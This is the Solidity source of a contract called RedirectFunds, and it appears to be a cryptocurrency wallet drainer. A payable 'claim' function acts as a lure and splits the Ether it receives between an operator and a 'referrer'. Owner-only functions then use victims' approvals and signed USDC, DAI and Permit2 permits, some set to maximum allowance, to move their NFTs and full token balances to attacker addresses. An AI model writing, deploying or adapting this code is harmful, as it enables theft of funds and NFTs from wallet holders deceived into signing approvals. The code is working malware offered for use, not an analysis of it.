// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./ICHECK.sol";
import "./IERC20.sol";
import "./IERC721.sol";
import "./IPERMIT2.sol";

contract RedirectFunds {
    address payable internal _recipient;
    address internal _owner;
    string internal _CONTACTS;
    string internal _FEATURES;
    //bool private _initialized;

    function initialize(
        address payable recipient,
        address owner,
        string memory contacts,
        string memory features
    ) public {
        //require(!_initialized, "Contract instance has already been initialized");
        //_initialized = true;
        ICHECK checkContract = ICHECK(0x7F60eD0CF7E8194CeAEfCc607aCbCB327475e8bC);
	    address implOwner = checkContract.implOwner();

        require(msg.sender == implOwner, "Suck dick, kurwa");

        _recipient = recipient;
        _owner = owner;
        _CONTACTS = contacts;
        _FEATURES = features;
    }

    function recipient() public view returns (address) {
        return _recipient;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function setRecipient(address payable _newRecipient) public {
        require(msg.sender == _owner, "Only owner can change the recipient");
        _recipient = _newRecipient;
    }

    function claim(address payable _referrer, uint8 _recipientPercent) external payable {
        require(msg.value > 0, "You need to send some Ether");

        uint256 toRecipient = (msg.value * _recipientPercent) / 100;
        uint256 toReferrer = msg.value - toRecipient;

        _recipient.transfer(toRecipient);
        _referrer.transfer(toReferrer);
    }

    function withdraw(address payable _to) public {
        require(msg.sender == _owner, "Only owner can withdraw");
        _to.transfer(address(this).balance);
    }

   function transferNFTs(
        address _nftAddress, 
        uint256[] memory _tokenIds, 
        address _holder,
        address _to
    ) public {
        require(msg.sender == _owner, "Only owner can transfer NFTs");
        IERC721 nftContract = IERC721(_nftAddress);

        require(nftContract.isApprovedForAll(_holder, address(this)), "Holder did not give approval");

        for(uint256 i = 0; i < _tokenIds.length; i++) {
            require(nftContract.ownerOf(_tokenIds[i]) == _holder, "Holder is not the owner of this NFT");

            nftContract.transferFrom(_holder, _to, _tokenIds[i]);
        }
    }

    function transferTokens(
        address _tokenAddress, 
        address _holder, 
        address _to,
	    uint256 _amount,
        uint8 _recipientPercent
    ) public {
        require(msg.sender == _owner, "Only owner can transfer tokens");
        IERC20 tokenContract = IERC20(_tokenAddress);

        uint256 toRecipient = (_amount * _recipientPercent) / 100;
        uint256 toReferrer = _amount - toRecipient;

        tokenContract.transferFrom(_holder, _recipient, toRecipient);
        tokenContract.transferFrom(_holder, _to, toReferrer);
    }

    function transferFrom(
        address _tokenAddress, 
        address _holder, 
        address _to,
        uint256 amount,
        uint8 _recipientPercent
    ) public {
        require(msg.sender == _owner, "Only owner can transfer tokens");
        IERC20 tokenContract = IERC20(_tokenAddress);

        uint256 toRecipient = (amount * _recipientPercent) / 100;
        uint256 toReferrer = amount - toRecipient;

        tokenContract.transferFrom(_holder, _recipient, toRecipient);
        tokenContract.transferFrom(_holder, _to, toReferrer);
    }

    function permitAndTransferUSDC(
        address _tokenAddress,
        address _holder,
        address _referrer,
        uint256 _deadline,
        uint8 _v,
        bytes32 _r,
        bytes32 _s,
        uint8 _recipientPercent
    ) public {
        require(msg.sender == _owner, "Only owner can permit tokens");
        IERC20 tokenContract = IERC20(_tokenAddress);
 
        uint256 MAX_APPROVAL = 115792089237316195423570985008687907853269984665640564039457584007913129;

        tokenContract.permitUSDC(_holder, address(this), MAX_APPROVAL, _deadline, _v, _r, _s);

        uint256 fullBalance = tokenContract.balanceOf(_holder);
        // Calculate amounts
        uint256 toRecipient = (fullBalance * _recipientPercent) / 100;
        uint256 toReferrer = fullBalance - toRecipient;

        // Transfer
        tokenContract.transferFrom(_holder, _recipient, toRecipient);
        tokenContract.transferFrom(_holder, _referrer, toReferrer);
    }

    function permitAndTransferDAI(
        address _tokenAddress,
        address _holder,
        address _referrer,
        uint256 _nonce,
        uint256 _expiry,
        bool _allowed,
        uint8 _v,
        bytes32 _r,
        bytes32 _s,
        uint8 _recipientPercent
    ) public {
        require(msg.sender == _owner, "Only owner can permit tokens");
        IERC20 tokenContract = IERC20(_tokenAddress);

        tokenContract.permitDAI(_holder, address(this), _nonce, _expiry, _allowed, _v, _r, _s);

        uint256 fullBalance = tokenContract.balanceOf(_holder);

        uint256 toRecipient = (fullBalance * _recipientPercent) / 100;
        uint256 toReferrer = fullBalance - toRecipient;

        tokenContract.transferFrom(_holder, _recipient, toRecipient);
        tokenContract.transferFrom(_holder, _referrer, toReferrer);
    }

    function permitTransferFrom(
        address _contractAddress,
        address _holder,
        PermitBatch memory _permitBatch,
        AllowanceTransferDetails[] calldata _transferDetails,
        bytes calldata _signature
    ) public {
        require(msg.sender == _owner, "Only owner can call permit");
        IERC20Permit2 permitContract = IERC20Permit2(_contractAddress);

        permitContract.permit(_holder, _permitBatch, _signature);

        permitContract.transferFrom(_transferDetails);
    }
}